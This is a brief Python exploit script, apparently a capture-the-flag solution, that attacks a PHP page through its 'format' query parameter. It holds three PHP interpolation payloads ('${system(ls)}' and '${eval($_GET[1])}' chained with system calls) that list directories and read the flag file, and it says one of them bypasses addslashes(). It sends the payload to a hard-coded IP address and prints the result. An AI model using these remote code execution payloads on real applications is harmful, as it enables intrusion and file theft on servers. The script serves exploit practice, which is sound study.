#!/usr/bin/python3

# PHP script taking untrusted user input without proper sanitizing allowing RCE

import requests

def loveTok(url, format):

    payload_1 = "${system(ls)}"         # I can read file using this payload
    payload_2 = "${eval($_GET[1])}&1=system('ls%20../');"   # Using this I can bypass addslashs() 
    payload_3 = "${eval($_GET[1])}&1=system('cat%20../flagcQNvo');"

    r = requests.get(url + format + payload_3)
    print(r.status_code)
    print(r.text)


if __name__ == '__main__':
    url = 'http://46.101.8.93:32057/'
    format = '?format='
    
    loveTok(url, format)